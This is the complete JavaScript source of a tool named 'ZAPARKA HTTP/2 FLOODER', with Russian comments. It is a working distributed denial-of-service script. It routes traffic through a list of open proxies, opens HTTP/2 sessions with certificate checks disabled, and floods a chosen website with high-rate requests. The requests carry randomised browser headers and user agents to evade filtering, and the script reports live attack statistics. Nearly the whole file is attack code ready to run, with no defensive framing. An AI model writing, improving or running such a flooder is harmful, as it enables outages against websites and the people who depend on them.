const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});

// Цвета для консоли
const colors = {
    reset: "\x1b[0m",
    bright: "\x1b[1m",
    red: "\x1b[31m",
    green: "\x1b[32m",
    yellow: "\x1b[33m",
    blue: "\x1b[34m",
    magenta: "\x1b[35m",
    cyan: "\x1b[36m",
    white: "\x1b[37m",
    bgRed: "\x1b[41m",
    bgGreen: "\x1b[42m",
    bgBlue: "\x1b[44m"
};

function log(message, color = colors.white) {
    console.log(`${color}${message}${colors.reset}`);
}

function banner() {
    console.clear();
    log("╔══════════════════════════════════════════════════╗", colors.cyan);
    log("║           ZAPARKA HTTP/2 FLOODER v2.0           ║", colors.bright + colors.cyan);
    log("╚══════════════════════════════════════════════════╝", colors.cyan);
    log("");
}

if (process.argv.length < 7) {
    banner();
    log("Usage: node zaparka_improved.js target time rate thread proxyfile", colors.yellow);
    log("Example: node zaparka_improved.js https://example.com 60 100 4 proxies.txt", colors.green);
    process.exit();
}

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const CONNECTIONS_PER_WORKER = 3;

// Статистика
let stats = {
    requests: 0,
    successful: 0,
    failed: 0,
    connections: 0,
    startTime: Date.now()
};

if (cluster.isMaster) {
    banner();
    log(`[${colors.green}✓${colors.white}] Target: ${colors.bright}${args.target}${colors.reset}`, colors.white);
    log(`[${colors.green}✓${colors.white}] Duration: ${colors.bright}${args.time}s${colors.reset}`, colors.white);
    log(`[${colors.green}✓${colors.white}] Rate: ${colors.bright}${args.Rate} req/s${colors.reset}`, colors.white);
    log(`[${colors.green}✓${colors.white}] Threads: ${colors.bright}${args.threads}${colors.reset}`, colors.white);
    log(`[${colors.green}✓${colors.white}] Proxies: ${colors.bright}${proxies.length}${colors.reset}`, colors.white);
    log(`[${colors.green}✓${colors.white}] Connections per worker: ${colors.bright}${CONNECTIONS_PER_WORKER}${colors.reset}`, colors.white);
    log("");
    log("═".repeat(50), colors.cyan);
    log("");

    // Создаём воркеры
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
        log(`[${colors.blue}⚡${colors.white}] Worker #${counter} spawned`, colors.blue);
    }

    log("");
    log("═".repeat(50), colors.cyan);
    log(`[${colors.green}►${colors.white}] Attack started!`, colors.green);
    log("");

    // Статистика от воркеров
    let totalRequests = 0;
    let totalConnections = 0;
    let totalErrors = 0;

    cluster.on('message', (worker, message) => {
        if (message.type === 'stats') {
            totalRequests += message.requests;
            totalConnections += message.connections;
            totalErrors += message.errors;
        }
    });

    // Вывод статистики каждую секунду
    const statsInterval = setInterval(() => {
        const elapsed = Math.floor((Date.now() - stats.startTime) / 1000);
        const rps = Math.floor(totalRequests / elapsed);
        
        process.stdout.write('\r\x1b[K'); // Очистка строки
        process.stdout.write(
            `${colors.bright}[${elapsed}s]${colors.reset} ` +
            `${colors.green}Requests: ${totalRequests}${colors.reset} | ` +
            `${colors.cyan}RPS: ${rps}${colors.reset} | ` +
            `${colors.blue}Connections: ${totalConnections}${colors.reset} | ` +
            `${colors.red}Errors: ${totalErrors}${colors.reset}`
        );
    }, 1000);

    // Завершение
    setTimeout(() => {
        clearInterval(statsInterval);
        console.log("\n");
        log("═".repeat(50), colors.cyan);
        log(`[${colors.green}✓${colors.white}] Attack completed!`, colors.green);
        log("");
        log(`Total Requests: ${colors.bright}${totalRequests}${colors.reset}`, colors.white);
        log(`Total Connections: ${colors.bright}${totalConnections}${colors.reset}`, colors.white);
        log(`Total Errors: ${colors.bright}${totalErrors}${colors.reset}`, colors.white);
        log(`Average RPS: ${colors.bright}${Math.floor(totalRequests / args.time)}${colors.reset}`, colors.white);
        log("");
        log("═".repeat(50), colors.cyan);
        process.exit(0);
    }, args.time * 1000);

} else {
    // Воркер - статистика
    let workerStats = {
        requests: 0,
        connections: 0,
        errors: 0
    };

    // Отправка статистики мастеру каждую секунду
    setInterval(() => {
        process.send({
            type: 'stats',
            requests: workerStats.requests,
            connections: workerStats.connections,
            errors: workerStats.errors
        });
        workerStats = { requests: 0, connections: 0, errors: 0 };
    }, 1000);

    for (let i = 0; i < CONNECTIONS_PER_WORKER; i++) {
        setTimeout(() => {
            setInterval(() => runFlooder(workerStats), 1);
        }, i * 100);
    }
}

class NetSocket {
    constructor() {}

    HTTP(options, callback) {
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = Buffer.from(payload);

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 60000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const fetch_site = ["same-origin", "same-site", "cross-site"];
const fetch_mode = ["navigate", "same-origin", "no-cors", "cors"];
const fetch_dest = ["document", "sharedworker", "worker"];
const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8"
];

const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:135.0) Gecko/20100101 Firefox/135.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:132.0) Gecko/20100101 Firefox/132.0"
];

const Header = new NetSocket();

function buildHeaders() {
    return {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": parsedTarget.path || "/",
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br, zstd",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": randomElement(fetch_dest),
        "sec-fetch-mode": randomElement(fetch_mode),
        "upgrade-insecure-requests": "1",
        "te": "trailers"
    };
}

function runFlooder(workerStats) {
    const proxyAddr = randomElement(proxies);
    if (!proxyAddr || !proxyAddr.includes(":")) return;
    
    const parsedProxy = proxyAddr.split(":");

    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host + ":443",
        timeout: 100
    };

    Header.HTTP(proxyOptions, (connection, error) => {
        if (error) {
            workerStats.errors++;
            return;
        }

        workerStats.connections++;
        connection.setKeepAlive(true, 60000);

        const tlsOptions = {
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host,
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60 * 10000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 2000,
                initialWindowSize: 6291456,
                maxHeaderListSize: 262144,
                enablePush: false
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn,
            socket: connection,
        });

        client.settings({
            headerTableSize: 65536,
            maxConcurrentStreams: 2000,
            initialWindowSize: 6291456,
            maxHeaderListSize: 262144,
            enablePush: false
        });

        let intervalAttack = null;

        client.on("connect", () => {
            intervalAttack = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = buildHeaders();
                    const request = client.request(headers);

                    request.on("response", () => {
                        workerStats.requests++;
                        request.close();
                        request.destroy();
                    });

                    request.setTimeout(5000, () => {
                        request.close();
                        request.destroy();
                    });

                    request.on("error", () => {
                        workerStats.errors++;
                        request.destroy();
                    });

                    request.end();
                }
            }, 1000);
        });

        client.on("close", () => {
            if (intervalAttack) clearInterval(intervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        client.on("error", () => {
            workerStats.errors++;
            if (intervalAttack) clearInterval(intervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        tlsConn.on("error", () => {
            workerStats.errors++;
            if (intervalAttack) clearInterval(intervalAttack);
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);
